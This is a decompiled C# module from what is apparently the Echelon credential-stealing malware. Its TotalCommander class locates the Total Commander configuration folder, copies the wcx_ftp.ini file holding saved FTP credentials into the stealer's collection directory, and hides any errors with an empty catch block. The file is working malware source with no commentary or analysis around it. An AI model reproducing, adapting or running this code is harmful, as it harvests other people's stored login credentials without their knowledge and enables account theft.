﻿using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.FTP
{
	// Token: 0x0200001E RID: 30
	internal class TotalCommander
	{
		// Token: 0x06000076 RID: 118 RVA: 0x0001AB74 File Offset: 0x00018D74
		public static void GetTotalCommander(string Echelon_Dir)
		{
			try
			{
				string text = Help.AppDate + "\\GHISLER\\";
				if (Directory.Exists(text))
				{
					Directory.CreateDirectory(Echelon_Dir + "\\FTP\\Total Commander");
				}
				FileInfo[] files = new DirectoryInfo(text).GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					if (files[i].Name.Contains("wcx_ftp.ini"))
					{
						File.Copy(text + "wcx_ftp.ini", Echelon_Dir + "\\FTP\\Total Commander\\wcx_ftp.ini");
						TotalCommander.count++;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400005F RID: 95
		public static int count;
	}
}
